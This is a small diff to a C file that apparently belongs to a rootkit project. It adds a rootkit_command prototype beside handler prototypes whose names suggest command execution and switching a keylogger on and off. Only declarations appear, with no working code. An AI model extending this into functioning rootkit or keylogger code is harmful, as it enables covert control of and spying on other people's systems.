@@ -15,6 +15,10 @@ struct command {
 	int (*cmd_handler)(char *args);
 };
 
+// Function prototypes
+int rootkit_command(char *command, unsigned command_size);
+
+// Handler prototypes
 int exec_handler(char *args);
 int klgon_handler(char *args);
 int klgoff_handler(char *args);
